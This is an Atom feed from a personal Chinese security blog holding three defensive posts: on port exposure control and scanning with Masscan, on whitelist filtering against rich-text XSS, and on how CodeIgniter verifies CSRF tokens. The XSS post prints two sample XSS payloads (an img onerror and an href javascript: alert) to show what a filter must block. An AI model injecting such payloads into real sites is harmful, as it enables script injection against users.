<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Wismartzy&#39;s Blog</title>
  <subtitle>Choose your love, love your choice.</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://wismartzy.github.io/"/>
  <updated>2017-03-19T07:25:54.000Z</updated>
  <id>http://wismartzy.github.io/</id>
  
  <author>
    <name>Wismartzy</name>
    <email>wismartzy@gmail.com</email>
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>不得不说的端口扫描</title>
    <link href="http://wismartzy.github.io/2017/02/19/port-scan/"/>
    <id>http://wismartzy.github.io/2017/02/19/port-scan/</id>
    <published>2017-02-19T03:40:04.000Z</published>
    <updated>2017-03-19T07:25:54.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p>在做企业生产网络安全相关工作时，首先考虑的就是对服务器端口的管控。可以这么说，中小型企业如果能对服务器端口做严格管控，极大程度上缩小了攻击面，那么入侵事件会相应少很多，对处于救火阶段的安全建设起到立竿见影效果，有点四两拨千斤的味道，值得安全人员花心思在上面。</p>
<h1 id="开放端口"><a href="#开放端口" class="headerlink" title="开放端口"></a>开放端口</h1><p>大致上可以定下如下规则：</p>
<ul>
<li>非业务端口一概不对外开放</li>
</ul>
<blockquote>
<p>可以在防火墙或其他网络设备上默认拒绝所有端口的（入/出）流量，然后再针对业务添加需要开放的端口，这样避免了管理工作上的混乱。</p>
</blockquote>
<ul>
<li>管理端口必须经过内部统一认证登录，必要时可以加上二次验证。</li>
</ul>
<blockquote>
<p>如果有堡垒机当然最好了，我在开发运维跳板机的过程就嵌入了 Google Authenticator 二次验证因子，使得员工登录服务器除了验证静态密钥外，还需要验证动态密码。</p>
</blockquote>
<ul>
<li>对那些开放外网权限的服务，需要做深入的渗透测试。</li>
</ul>
<blockquote>
<p>当然这并不能说要求渗透测试找出所有安全问题，这是不可能的，但是要保证不能携带高危漏洞上线，并且要求做到在收到安全告警时能迅速定位到问题，这才是最主要的。</p>
</blockquote>
<p>严格按照上面的规则执行，抵御一些脚本小子的恶意攻击还是绰绰有余的。</p>
<a id="more"></a>
<h1 id="监控管理"><a href="#监控管理" class="headerlink" title="监控管理"></a>监控管理</h1><p>制定了规则，如何及时发现遗漏或者错误呢？换句话说也就是如何来做端口状态监控这事情呢？有一款 HIDS 是通过定期在主机上执行 netstat 命令探测端口开放情况的，但在一般的互联网创业公司，考虑到成本和收益，这种 HIDS 在服务器上部署 Agent 的方式很少被采用，服务器上仅部署业务相关服务，部署 HIDS 显得过于臃肿了。</p>
<p>在多人运维的环境中，iptables 规则被改错或者设错的情况时有发生，不知不觉高危端口就对外开放了（比如说 SSH，Redis 等），带来的后果十分严重，具体危害可以参考前段时间的（MongoDB）勒索事件以及前年（2015年）的<a href="http://wismartzy.github.io/2015/11/11/Redis-crackIT/"> Redis 事件</a>。</p>
<p>除了规范 iptables 操作外，我们还能做的就是定期对公司 IP 资产做端口扫描，包括服务发现，如果探测是 HTTP 服务，则需要抓取 title 信息。为了提高扫描产出比，分两个任务执行，全端口扫描（次/周）和常规端口扫描（次/天）。全端口这里就不解释了，常规端口就是指一些企业常用到的端口，比如 SSH(22)，Rsync(873)，MySQL(3306)，8080…。这里推荐下猪猪侠的工具 <a href="https://github.com/ring04h/wyportmap" target="_blank" rel="external">Wyportmap</a>，自己拿来修改下是能满足需求的，工具原理就是利用 Python 的 libnmap 库调用 Nmap 扫描引擎对目标进行扫描。大家都知道 Nmap 这款工具，在端口扫描和服务发现上，该工具的确很赞，也是业内主推的安全渗透测试必备神器，但是 Nmap 有个最大的问题就是慢，当 IP 量上来后，全端口扫描太费时间，严重影响了扫描策略的执行，无法及时反馈端口状态信息，这就完全失去了监控的意义。后面经过调研，决定用 Masscan 替换 Nmap 扫描引擎，Masscan 号称最快的互联网端口扫描器，最快情况下可以在 6 分钟内扫遍互联网。能这么快完全是取决于其扫描方式，Masscan 的扫描并没进行完整的 TCP 三次握手，采用无状态扫描技术可以快速探测 IP 端口开放情况。另外它还支持自定义黑白名单，并可以根据自己情况设置扫描速率。关于 Masscan 的详细介绍可以看 <a href="https://github.com/robertdavidgraham/masscan" target="_blank" rel="external">Github</a></p>
<h1 id="PortScan"><a href="#PortScan" class="headerlink" title="PortScan"></a>PortScan</h1><p>我用 Python 给 Masscan 包了一层，主要是解决 Masscan 对 Nmap-style IP 支持不怎么友好的问题，一言不合就改造成了方便使用的扫描工具了，当然其实也可以自己动手改 Masscan 源码，优化下扫描引擎的参数，再自行编译即可。 可以很方便的使用 Masscan 对给定的目标 IP 做端口扫描。<br>替换上 Masscan 扫描引擎后，同样的 IP 量，全端口扫描的时间缩短到分钟级别（能透露的就这么多了-.-!），反正就是很快啦。当然这个快也带来了相应的代价，就是在准确率上会有一些折扣。</p>
<p>为了方便操作管理，为该扫描服务还开发了一套基于 Web 的系统 — PortScan，这里可以自定义扫描模板，并添加扫描任务，对每个扫描任务还可以设置定时任务，指定运行周期。</p>
<p><img src="/images/portscan.png" alt="portscan"></p>
<p>场景不单单适用于自己公司哦，比如我先定一个小目标，收集各大 SRC 厂商的 IP 列表，分别添加扫描任务并设置扫描周期，会有意想不到的效果。针对企业告警信息混乱，还添加了设置白名单功能，比如对一些已知的业务端口设置白名单，这样监控层面做到仅关注白名单外的情况，及时发现问题。</p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>在一些中小互联网公司（安全人员有限）开展端口扫描工作还是很有必要的，尽量把攻击面缩小到已知范围，当然这也不是说企业就绝对安全了，这只是能缓解一些脚本小子的扫描攻击，面对黑客，要时常保持警惕，说不定他就在内网盯着你…</p>
]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;概述&quot;&gt;&lt;a href=&quot;#概述&quot; class=&quot;headerlink&quot; title=&quot;概述&quot;&gt;&lt;/a&gt;概述&lt;/h1&gt;&lt;p&gt;在做企业生产网络安全相关工作时，首先考虑的就是对服务器端口的管控。可以这么说，中小型企业如果能对服务器端口做严格管控，极大程度上缩小了攻击面，那么入侵事件会相应少很多，对处于救火阶段的安全建设起到立竿见影效果，有点四两拨千斤的味道，值得安全人员花心思在上面。&lt;/p&gt;
&lt;h1 id=&quot;开放端口&quot;&gt;&lt;a href=&quot;#开放端口&quot; class=&quot;headerlink&quot; title=&quot;开放端口&quot;&gt;&lt;/a&gt;开放端口&lt;/h1&gt;&lt;p&gt;大致上可以定下如下规则：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;非业务端口一概不对外开放&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;可以在防火墙或其他网络设备上默认拒绝所有端口的（入/出）流量，然后再针对业务添加需要开放的端口，这样避免了管理工作上的混乱。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;管理端口必须经过内部统一认证登录，必要时可以加上二次验证。&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;如果有堡垒机当然最好了，我在开发运维跳板机的过程就嵌入了 Google Authenticator 二次验证因子，使得员工登录服务器除了验证静态密钥外，还需要验证动态密码。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;对那些开放外网权限的服务，需要做深入的渗透测试。&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;当然这并不能说要求渗透测试找出所有安全问题，这是不可能的，但是要保证不能携带高危漏洞上线，并且要求做到在收到安全告警时能迅速定位到问题，这才是最主要的。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;严格按照上面的规则执行，抵御一些脚本小子的恶意攻击还是绰绰有余的。&lt;/p&gt;
    
    </summary>
    
    
      <category term="安全" scheme="http://wismartzy.github.io/tags/%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>富文本 xss 问题</title>
    <link href="http://wismartzy.github.io/2016/11/21/fu-wen-ben-xss/"/>
    <id>http://wismartzy.github.io/2016/11/21/fu-wen-ben-xss/</id>
    <published>2016-11-21T14:52:03.000Z</published>
    <updated>2017-03-21T15:04:01.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h1><p>内部一次渗透测试中发现页面提供了富文本输入功能，经过简单的测试发现存在 XSS 问题，这里把考虑的防御方案记录一下。</p>
<h1 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h1><p>富文本的情况和我们平常遇到的一些 XSS 案例不一样，不是简单的在输出位置做针对性过滤就行的，因为既然提供富文本编辑器，那么肯定是内容需要支持某些标签输入输出，如果 XSS FILTER 直接干掉了标签，会影响到内容的展示，所以有必要对富文本情况拎出来单独处理。</p>
<p>有人说用黑名单处理，过滤掉那些危险的标签，那么你会掉进一个有无限 case 要处理的坑里，暂且不说能把现有的危险标签罗列完整，H5 出来后新增的那些标签特性简直就是噩梦。另外，就算考虑再周到，也要知道这个世界上还有一款浏览器叫做 IE，奇葩的解析方式简直让人防不胜防，完全不按套路出牌。</p>
<a id="more"></a>
<h1 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h1><p>既然黑名单不适合，那么自然就想到白名单的方式，这是目前来说比较好的防御富文本 XSS 方式。具体工作分以下几个方面：</p>
<ul>
<li><p>确定白名单</p>
</li>
<li><p>解析 DOM 树，非白名单直接丢弃</p>
</li>
</ul>
<p>比如该处内容用不到 svg 标签，但要用 img 标签，那么可以把 img 标签加入白名单，那么在 DOM 解析结束时候就会丢弃所有非 img 标签的 html 代码。除了标签，还需要注意到标签属性，比如我在白名单标签 img 里面插入这样的代码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;img src=“<span class="comment">#” onerror=alert(/xss/)&gt;</span></div></pre></td></tr></table></figure>
<p>这就造成了 XSS 问题，所以针对属性也要做白名单处理，当然，也可以对属性做过滤转义，尤其是单、双引号，括号等控制字符。</p>
<ul>
<li>解析属性位置</li>
</ul>
<p>有两种情况，属性值位置出现在 href 这类位置的时候，其实可以利用 </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;a href=javascript:alert(<span class="number">1</span>)&gt;</div></pre></td></tr></table></figure>
<p>这样构造 XSS payload，那么这个时候应该解析出协议，判断协议是否在白名单内，协议在白名单内的情况下再判断域名是否在白名单内，符合则继续渲染，否则清空该属性值。</p>
<p>另外一种是属性位置在 CSS 位置，这里的 XSS 也很常见，一般通过检测是否含有敏感词，比如 javascript、background、eval 等，一般富文本里不会这么写的，遇到这样的就可以清空属性了，由于 CSS 输出在 HTML 环境，所以还得考虑 payload 被编码的情况，比如 &amp;# 这样的字符实体编码，另外据了解，IE 这货居然还支持 CSS 位置解析 Unicode 编码，表示摊手。</p>
<ul>
<li>flash xss 处理</li>
</ul>
<p>这个参考网上解决方案，比较粗暴，我们没用到 flash ，所以统一设置：allowScriptAccess 设置为 never，allowNetworking 设置为 none，下面是两参数的解释：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">allowScriptAccess用来控制flash与html的通讯，可选的值为：</div><div class="line">	always <span class="comment">//对与html的通讯也就是执行javascript不做任何限制</span></div><div class="line">	sameDomain <span class="comment">//只允许来自于本域的flash与html通讯，这是默认值</span></div><div class="line">	never <span class="comment">//绝对禁止flash与页面的通讯</span></div><div class="line"></div><div class="line">allowNetworking <span class="comment">//用来控制flash与外部的网络通讯，可选的值为：</span></div><div class="line">	all <span class="comment">//允许使用所有的网络通讯，也是默认值</span></div><div class="line">	internal <span class="comment">//flash不能与浏览器通讯如navigateToURL，但是可以调用其他的API</span></div><div class="line">	none <span class="comment">//禁止任何的网络通讯</span></div></pre></td></tr></table></figure>
<h1 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h1><p>富文本防御 XSS 的方案大致就这样，自己如果不想实现这样一个白名单过滤器的话，可以参考网上的 <a href="http://htmlpurifier.org/" target="_blank" rel="external">HTML Purifie</a>，PHP 实现的一个 XSS 过滤器，使用起来比较方便。</p>
]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;0x01&quot;&gt;&lt;a href=&quot;#0x01&quot; class=&quot;headerlink&quot; title=&quot;0x01&quot;&gt;&lt;/a&gt;0x01&lt;/h1&gt;&lt;p&gt;内部一次渗透测试中发现页面提供了富文本输入功能，经过简单的测试发现存在 XSS 问题，这里把考虑的防御方案记录一下。&lt;/p&gt;
&lt;h1 id=&quot;0x02&quot;&gt;&lt;a href=&quot;#0x02&quot; class=&quot;headerlink&quot; title=&quot;0x02&quot;&gt;&lt;/a&gt;0x02&lt;/h1&gt;&lt;p&gt;富文本的情况和我们平常遇到的一些 XSS 案例不一样，不是简单的在输出位置做针对性过滤就行的，因为既然提供富文本编辑器，那么肯定是内容需要支持某些标签输入输出，如果 XSS FILTER 直接干掉了标签，会影响到内容的展示，所以有必要对富文本情况拎出来单独处理。&lt;/p&gt;
&lt;p&gt;有人说用黑名单处理，过滤掉那些危险的标签，那么你会掉进一个有无限 case 要处理的坑里，暂且不说能把现有的危险标签罗列完整，H5 出来后新增的那些标签特性简直就是噩梦。另外，就算考虑再周到，也要知道这个世界上还有一款浏览器叫做 IE，奇葩的解析方式简直让人防不胜防，完全不按套路出牌。&lt;/p&gt;
    
    </summary>
    
    
      <category term="安全" scheme="http://wismartzy.github.io/tags/%E5%AE%89%E5%85%A8/"/>
    
      <category term="xss" scheme="http://wismartzy.github.io/tags/xss/"/>
    
  </entry>
  
  <entry>
    <title>Codeigniter 是怎么做 CSRF 防御的</title>
    <link href="http://wismartzy.github.io/2016/09/27/how-codeigniter-do-CSRF-protection/"/>
    <id>http://wismartzy.github.io/2016/09/27/how-codeigniter-do-CSRF-protection/</id>
    <published>2016-09-27T07:01:48.000Z</published>
    <updated>2017-03-19T02:29:25.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>关于如何启用 CSRF 防护，Codeigniter(CI) 官方<a href="http://codeigniter.org.cn/user_guide/libraries/security.html" target="_blank" rel="external">文档</a>有详细说明。</p>
<p>CSRF 的防御一般比较通用的方案有：</p>
<ul>
<li>Referer验证</li>
<li>Token验证</li>
<li>验证码防御</li>
</ul>
<p>Referer 验证用起来比较简单，但由于各浏览器在 Referer 字段上有着不同的标准，再加上部分验证代码存在逻辑漏洞，所以，一直以来这个方案存在被绕过的风险，效果不是特别理想。而验证码防御的方案又对用户体验有比较大的影响，所以目前来说，基于 token 的验证是最为可用的 CSRF 防护方案，大量开源框架都采用这种方式来抵御 CSRF 攻击的。当然，也有组合这几种的防御方案，效果比单一使用某一方案更优。</p>
<h2 id="CI-amp-CSRF"><a href="#CI-amp-CSRF" class="headerlink" title="CI &amp; CSRF"></a>CI &amp; CSRF</h2><p>CI 默认并未开启 CSRF 防御</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// /application/config/config.php</span></div><div class="line">$config[<span class="string">'csrf_protection'</span>] = <span class="keyword">FALSE</span>;</div></pre></td></tr></table></figure>
<p>若将该值设置为<code>TRUE</code>，则 CI 会对每个 POST 请求进行 CSRF Verify</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// /system/core/Input.php</span></div><div class="line">		<span class="comment">// CSRF Protection check</span></div><div class="line">		<span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;_enable_csrf === <span class="keyword">TRUE</span> &amp;&amp; ! is_cli())</div><div class="line">		&#123;</div><div class="line">			<span class="keyword">$this</span>-&gt;security-&gt;csrf_verify();</div><div class="line">		&#125;</div></pre></td></tr></table></figure>
<a id="more"></a>
<p>上面这一步是在 Input 类的 construct 函数里进行的，这意味着一旦开启 CSRF 防御，将全局作用于所有请求，这样不得不为每个 POST 表单添加一个 token 字段，否则请求会被中断。使用 CI 内置的 <code>form_open()</code> 函数将会自动地在表单中插入一个隐藏的 CSRF 字段，但是如果用 Ajax 去提交 POST 请求，就得为每个请求手动添加 csrf_cookie_name 字段，随请求一起传给服务端。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// /system/core/Security.php</span></div><div class="line">	<span class="comment">/**</span></div><div class="line">	 * CSRF Verify</div><div class="line">	 *</div><div class="line">	 * <span class="doctag">@return</span>	CI_Security</div><div class="line">	 */</div><div class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">csrf_verify</span><span class="params">()</span></span></div><div class="line">	&#123;</div><div class="line">		<span class="comment">// If it's not a POST request we will set the CSRF cookie</span></div><div class="line">		<span class="keyword">if</span> (strtoupper($_SERVER[<span class="string">'REQUEST_METHOD'</span>]) !== <span class="string">'POST'</span>)</div><div class="line">		&#123;</div><div class="line">			<span class="keyword">return</span> <span class="keyword">$this</span>-&gt;csrf_set_cookie();</div><div class="line">		&#125;</div><div class="line"></div><div class="line">		<span class="comment">// Check if URI has been whitelisted from CSRF checks</span></div><div class="line">		<span class="keyword">if</span> ($exclude_uris = config_item(<span class="string">'csrf_exclude_uris'</span>))</div><div class="line">		&#123;</div><div class="line">			$uri = load_class(<span class="string">'URI'</span>, <span class="string">'core'</span>);</div><div class="line">			<span class="keyword">foreach</span> ($exclude_uris <span class="keyword">as</span> $excluded)</div><div class="line">			&#123;</div><div class="line">				<span class="keyword">if</span> (preg_match(<span class="string">'#^'</span>.$excluded.<span class="string">'$#i'</span>.(UTF8_ENABLED ? <span class="string">'u'</span> : <span class="string">''</span>), $uri-&gt;uri_string()))</div><div class="line">				&#123;</div><div class="line">					<span class="keyword">return</span> <span class="keyword">$this</span>;</div><div class="line">				&#125;</div><div class="line">			&#125;</div><div class="line">		&#125;</div><div class="line"></div><div class="line">		<span class="comment">// Do the tokens exist in both the _POST and _COOKIE arrays?</span></div><div class="line">		<span class="keyword">if</span> ( ! <span class="keyword">isset</span>($_POST[<span class="keyword">$this</span>-&gt;_csrf_token_name], $_COOKIE[<span class="keyword">$this</span>-&gt;_csrf_cookie_name])</div><div class="line">			<span class="keyword">OR</span> $_POST[<span class="keyword">$this</span>-&gt;_csrf_token_name] !== $_COOKIE[<span class="keyword">$this</span>-&gt;_csrf_cookie_name]) <span class="comment">// Do the tokens match?</span></div><div class="line">		&#123;</div><div class="line">			<span class="keyword">$this</span>-&gt;csrf_show_error();</div><div class="line">		&#125;</div><div class="line"></div><div class="line">		<span class="comment">// We kill this since we're done and we don't want to polute the _POST array</span></div><div class="line">		<span class="keyword">unset</span>($_POST[<span class="keyword">$this</span>-&gt;_csrf_token_name]);</div><div class="line"></div><div class="line">		<span class="comment">// Regenerate on every submission?</span></div><div class="line">		<span class="keyword">if</span> (config_item(<span class="string">'csrf_regenerate'</span>))</div><div class="line">		&#123;</div><div class="line">			<span class="comment">// Nothing should last forever</span></div><div class="line">			<span class="keyword">unset</span>($_COOKIE[<span class="keyword">$this</span>-&gt;_csrf_cookie_name]);</div><div class="line">			<span class="keyword">$this</span>-&gt;_csrf_hash = <span class="keyword">NULL</span>;</div><div class="line">		&#125;</div><div class="line"></div><div class="line">		<span class="keyword">$this</span>-&gt;_csrf_set_hash();</div><div class="line">		<span class="keyword">$this</span>-&gt;csrf_set_cookie();</div><div class="line"></div><div class="line">		log_message(<span class="string">'info'</span>, <span class="string">'CSRF token verified'</span>);</div><div class="line">		<span class="keyword">return</span> <span class="keyword">$this</span>;</div><div class="line">	&#125;</div></pre></td></tr></table></figure>
<p><code>csrf_verify()</code> 函数对非 POST 请求直接写 CSRF cookie，POST 请求就判断是否在 URI 的白名单里面，若不在白名单再进行判断 _POST 和 _COOKIE 里是否有 CSRF token，并且判断两者是否相等，只有在存在且相等的情况下才通过校验，否则提示错误403。这一步的逻辑其实是建立在发起 CSRF 攻击的黑客理论上无法获取第三方 cookie 基础上的，得不到 cookie 便无法构造表单里的 token，就过不了这里的 <code>csrf_verify()</code>。</p>
<p>在校验完成后，为了不污染 _POST 数组，CI 调用 unset 函数处理了 _POST 数组里的 csrf token，重新生成新的 token 并写到 cookie。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// /system/core/Security.php</span></div><div class="line">	<span class="comment">/**</span></div><div class="line">	 * CSRF Set Cookie</div><div class="line">	 *</div><div class="line">	 * <span class="doctag">@codeCoverageIgnore</span></div><div class="line">	 * <span class="doctag">@return</span>	CI_Security</div><div class="line">	 */</div><div class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">csrf_set_cookie</span><span class="params">()</span></span></div><div class="line">	&#123;</div><div class="line">		$expire = time() + <span class="keyword">$this</span>-&gt;_csrf_expire;</div><div class="line">		$secure_cookie = (bool) config_item(<span class="string">'cookie_secure'</span>);</div><div class="line"></div><div class="line">		<span class="keyword">if</span> ($secure_cookie &amp;&amp; ! is_https())</div><div class="line">		&#123;</div><div class="line">			<span class="keyword">return</span> <span class="keyword">FALSE</span>;</div><div class="line">		&#125;</div><div class="line"></div><div class="line">		setcookie(</div><div class="line">			<span class="keyword">$this</span>-&gt;_csrf_cookie_name,</div><div class="line">			<span class="keyword">$this</span>-&gt;_csrf_hash,</div><div class="line">			$expire,</div><div class="line">			config_item(<span class="string">'cookie_path'</span>),</div><div class="line">			config_item(<span class="string">'cookie_domain'</span>),</div><div class="line">			$secure_cookie,</div><div class="line">			config_item(<span class="string">'cookie_httponly'</span>)</div><div class="line">		);</div><div class="line">		log_message(<span class="string">'info'</span>, <span class="string">'CSRF cookie sent'</span>);</div><div class="line"></div><div class="line">		<span class="keyword">return</span> <span class="keyword">$this</span>;</div><div class="line">	&#125;</div></pre></td></tr></table></figure>
<p>上面是设置 CSRF 防御 cookie 的函数，cookie 属性可以从配置文件里读取</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// /application/config/config.php</span></div><div class="line">$config[<span class="string">'csrf_token_name'</span>] = <span class="string">'csrf_test_name'</span>;</div><div class="line">$config[<span class="string">'csrf_cookie_name'</span>] = <span class="string">'csrf_cookie_name'</span>;</div><div class="line">$config[<span class="string">'csrf_expire'</span>] = <span class="number">7200</span>;</div><div class="line">$config[<span class="string">'csrf_regenerate'</span>] = <span class="keyword">TRUE</span>;</div><div class="line">$config[<span class="string">'csrf_exclude_uris'</span>] = <span class="keyword">array</span>();</div></pre></td></tr></table></figure>
<p>cookie 有效期默认是7200秒，也就是2小时，由于一旦开启 CSRF 防御，就是全局作用于所有的请求，所以有时候难免会有误伤，但 CI 并没做到在 controller 层动态配置，而是在 Input 类初始化的位置调用 <code>csrf_verify()</code> 函数完成校验。当然，CI 开放了白名单策略，也就是配置文件里的 <code>$config[&#39;csrf_exclude_uris&#39;]</code> ，可以把不需要做 CSRF 防御的 uri 添加到该值里面。</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>从源码里不难看出 CI 通过比较 _COOKIE 和 _POST 中的 token 值来做 CSRF 防御，咋一看似乎觉得 _COOKIE 和 _POST 的内容对客户端来说都是可控的，但仔细思考一下，在 CSRF 的攻击场景下，攻击者是无法读取到受害者的 cookie 信息的，这也是该防御方式有效的前提所在。</p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;概述&quot;&gt;&lt;a href=&quot;#概述&quot; class=&quot;headerlink&quot; title=&quot;概述&quot;&gt;&lt;/a&gt;概述&lt;/h2&gt;&lt;p&gt;关于如何启用 CSRF 防护，Codeigniter(CI) 官方&lt;a href=&quot;http://codeigniter.org.cn/user_guide/libraries/security.html&quot;&gt;文档&lt;/a&gt;有详细说明。&lt;/p&gt;
&lt;p&gt;CSRF 的防御一般比较通用的方案有：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Referer验证&lt;/li&gt;
&lt;li&gt;Token验证&lt;/li&gt;
&lt;li&gt;验证码防御&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Referer 验证用起来比较简单，但由于各浏览器在 Referer 字段上有着不同的标准，再加上部分验证代码存在逻辑漏洞，所以，一直以来这个方案存在被绕过的风险，效果不是特别理想。而验证码防御的方案又对用户体验有比较大的影响，所以目前来说，基于 token 的验证是最为可用的 CSRF 防护方案，大量开源框架都采用这种方式来抵御 CSRF 攻击的。当然，也有组合这几种的防御方案，效果比单一使用某一方案更优。&lt;/p&gt;
&lt;h2 id=&quot;CI-amp-CSRF&quot;&gt;&lt;a href=&quot;#CI-amp-CSRF&quot; class=&quot;headerlink&quot; title=&quot;CI &amp;amp; CSRF&quot;&gt;&lt;/a&gt;CI &amp;amp; CSRF&lt;/h2&gt;&lt;p&gt;CI 默认并未开启 CSRF 防御&lt;/p&gt;
&lt;figure class=&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;// /application/config/config.php&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;$config[&lt;span class=&quot;string&quot;&gt;&#39;csrf_protection&#39;&lt;/span&gt;] = &lt;span class=&quot;keyword&quot;&gt;FALSE&lt;/span&gt;;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;若将该值设置为&lt;code&gt;TRUE&lt;/code&gt;，则 CI 会对每个 POST 请求进行 CSRF Verify&lt;/p&gt;
&lt;figure class=&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;// /system/core/Input.php&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;		&lt;span class=&quot;comment&quot;&gt;// CSRF Protection check&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;		&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (&lt;span class=&quot;keyword&quot;&gt;$this&lt;/span&gt;-&amp;gt;_enable_csrf === &lt;span class=&quot;keyword&quot;&gt;TRUE&lt;/span&gt; &amp;amp;&amp;amp; ! is_cli())&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;		&amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;			&lt;span class=&quot;keyword&quot;&gt;$this&lt;/span&gt;-&amp;gt;security-&amp;gt;csrf_verify();&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;		&amp;#125;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
    
      <category term="安全" scheme="http://wismartzy.github.io/tags/%E5%AE%89%E5%85%A8/"/>
    
      <category term="审计" scheme="http://wismartzy.github.io/tags/%E5%AE%A1%E8%AE%A1/"/>
    
